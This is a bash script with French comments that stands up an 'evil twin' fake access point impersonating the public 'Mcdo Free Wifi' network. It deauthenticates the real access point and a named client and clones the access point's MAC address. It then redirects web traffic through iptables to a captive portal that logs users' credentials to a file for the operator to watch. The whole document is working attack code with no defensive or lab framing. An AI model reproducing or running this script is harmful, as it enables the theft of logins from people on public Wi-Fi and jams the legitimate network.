#!/bin/bash
echo "========================================="
echo "   LANCEMENT EVIL TWIN - Mcdo Free Wifi"
echo "========================================="

SSID_CIBLE="Mcdo Free Wifi"

# === ÉTAPE 0 : Sécuriser l'Ethernet (anti perte SSH) ===
echo "[*] Sécurisation de la connexion Ethernet..."
sudo ip addr add 192.168.1.21/24 dev eth0 2>/dev/null
sudo ip link set eth0 up
sudo ip route add default via 192.168.1.254 dev eth0 2>/dev/null

# === ÉTAPE 1 : Tuer les processus conflictuels ===
echo "[*] Nettoyage des processus conflictuels..."
sudo airmon-ng check kill 2>/dev/null
sudo killall hostapd dnsmasq python3 2>/dev/null
sleep 1

# === ÉTAPE 2 : Clonage MAC automatique ===
echo "[*] Recherche de la MAC de '$SSID_CIBLE'..."

sudo ip link set wlan1 down
sudo iw dev wlan1 set type monitor
sudo ip link set wlan1 up
sleep 1

rm -f /tmp/scan-*.csv /tmp/scan-*.kismet.csv /tmp/scan-*.cap 2>/dev/null

sudo timeout 10 airodump-ng wlan1 \
    --essid "$SSID_CIBLE" \
    --output-format csv \
    -w /tmp/scan \
    --write-interval 1 2>/dev/null

CSV_FILE=$(ls -t /tmp/scan-*.csv 2>/dev/null | head -1)
MAC_CIBLE=$(grep -a "$SSID_CIBLE" "$CSV_FILE" 2>/dev/null | grep -v "Station" | head -1 | cut -d',' -f1 | tr -d ' ')

rm -f /tmp/scan-01.csv /tmp/scan-01.kismet.csv 2>/dev/null

if [ -n "$MAC_CIBLE" ]; then
    echo "[+] MAC trouvée : $MAC_CIBLE — réseau actif confirmé"
else
    echo "[-] Réseau '$SSID_CIBLE' introuvable — on continue sans clonage"
fi

# === ÉTAPE 2.5 : Deauth continu sur le réseau légitime ===
if [ -n "$MAC_CIBLE" ]; then
    echo "[*] Deauth continu sur $MAC_CIBLE pendant 15s..."

    # Forcer le canal correct
    sudo iwconfig wlan1 channel 6
    sleep 1

    sudo timeout 15 aireplay-ng --deauth 0 -a "$MAC_CIBLE" -c 20:f4:78:3d:19:0a wlan1 &
    DEAUTH_PID=$!
    sleep 15
    sudo kill $DEAUTH_PID 2>/dev/null
    echo "[+] Réseau légitime neutralisé"
fi
# === ÉTAPE 3 : Configurer l'interface wlan1 ===
echo "[*] Configuration de l'interface wlan1..."
sudo rfkill unblock all
sudo ip link set wlan1 down
sudo iw dev wlan1 set type managed

if [ -n "$MAC_CIBLE" ]; then
    sudo ip link set wlan1 address "$MAC_CIBLE"
    echo "[+] MAC clonée → $MAC_CIBLE"
fi

sudo ip addr flush dev wlan0
sudo ip link set wlan1 up
sleep 1
sudo ifconfig wlan1 192.168.50.1 netmask 255.255.255.0

# === ÉTAPE 4 : Règles iptables ===
echo "[*] Configuration des règles de redirection..."
sudo iptables --flush
sudo iptables --table nat --flush
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:80
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j DNAT --to-destination 192.168.50.1:80
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 ! -d 192.168.50.1 -j DNAT --to-destination 192.168.50.1:80
sudo iptables -I FORWARD -i wlan1 -j ACCEPT
sudo iptables -I FORWARD -o wlan1 -j ACCEPT
sudo iptables -I INPUT -i wlan1 -p tcp --dport 80 -j ACCEPT
sudo iptables -I INPUT -i wlan1 -p tcp --dport 443 -j ACCEPT
sudo iptables -I INPUT -i wlan1 -p udp --dport 53 -j ACCEPT

# === ÉTAPE 5 : Démarrer dnsmasq (DHCP + DNS) ===
echo "[*] Démarrage de dnsmasq..."
sudo dnsmasq -C /etc/dnsmasq.conf -d &
sleep 1

# === ÉTAPE 6 : Démarrer hostapd (faux AP) ===
echo "[*] Démarrage de hostapd..."
sudo hostapd /etc/hostapd/hostapd.conf &
sleep 2

# === ÉTAPE 7 : Démarrer le portail captif ===
echo "[*] Démarrage du portail captif..."
cd /home/kali/captive_portal && sudo python3 server.py &
sleep 1

echo ""
echo "========================================="
echo "[+] EVIL TWIN OPÉRATIONNEL"
echo "    SSID    : $SSID_CIBLE"
echo "    MAC     : ${MAC_CIBLE:-originale}"
echo "    Portail : http://192.168.50.1"
echo "    Logs    : /home/kali/captive_portal/credentials.log"
echo "========================================="
echo ""
echo "Surveille les credentials avec :"
echo "    tail -f /home/kali/captive_portal/credentials.log"
echo ""
echo "Pour arrêter : sudo ./stop_mcdo.sh"
wait
